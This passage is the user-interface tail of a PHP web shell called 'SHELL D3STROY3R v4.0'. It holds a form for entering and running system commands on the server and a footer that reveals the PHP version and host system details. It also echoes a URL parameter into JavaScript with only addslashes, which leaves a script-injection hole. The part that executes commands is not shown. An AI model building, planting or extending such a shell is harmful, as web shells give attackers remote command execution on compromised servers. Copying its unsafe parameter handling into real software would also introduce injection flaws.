            <form method="POST" style="display:flex;gap:10px;flex-wrap:wrap;">
                <input type="text" name="cmd" placeholder="ENTER SYSTEM COMMAND..." value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" style="flex:1;min-width:200px;">
                <button type="submit">▶ RUN</button>
            </form>
            <?php if ($cmd_out !== ''): ?>
                <div class="cmd-out"><?php echo htmlspecialchars($cmd_out); ?></div>
            <?php endif; ?>
        </div>

        <div class="footer">
            SHELL D3STROY3R v4.0 | PHP <?php echo phpversion(); ?> | <?php echo php_uname(); ?> | <span class="glow-text">[ SYSTEM ACTIVE ]</span>
        </div>
    </div>
    <script>
        document.addEventListener("click", function() {
            var audio = document.getElementById("main-audio");
            if (audio.paused) {
                audio.play().catch(function(e) {});
            }
        });
        // Highlight file if set from search
        <?php if (isset($_GET['highlight'])): ?>
            var highlight = "<?php echo addslashes($_GET['highlight']); ?>";
            var links = document.querySelectorAll('.file-list .file-info a');
            for (var i=0; i<links.length; i++) {
                if (links[i].textContent.trim() === highlight) {
                    links[i].style.textShadow = "0 0 30px #ff0044";
                    links[i].style.color = "#ff0044";
                    break;
                }
            }
        <?php endif; ?>
    </script>
</body>
</html>
<?php
// End of shell
?>